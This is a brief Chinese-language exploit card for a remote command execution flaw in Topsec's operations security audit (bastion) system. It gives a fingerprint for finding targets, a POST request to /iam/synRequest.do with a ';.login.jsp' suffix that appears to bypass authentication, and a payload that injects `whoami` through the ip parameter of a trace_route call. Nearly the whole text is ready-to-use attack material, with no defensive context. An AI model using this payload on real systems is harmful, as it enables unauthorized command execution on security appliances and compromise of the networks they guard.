# 天融信运维安全审计系统synRequest存在远程命令执行漏洞

天融信运维安全审计系统 ｜ 命令执行 ｜ —
- **指纹**：`header="iam"`
- **请求**：`POST /iam/synRequest.do;.login.jsp HTTP/1.1`

**Payload**
```
method=trace\_route\&w=1\&ip=127.0.0.1echo%20`whoami`%3b\&m=10
```
- **响应特征**：200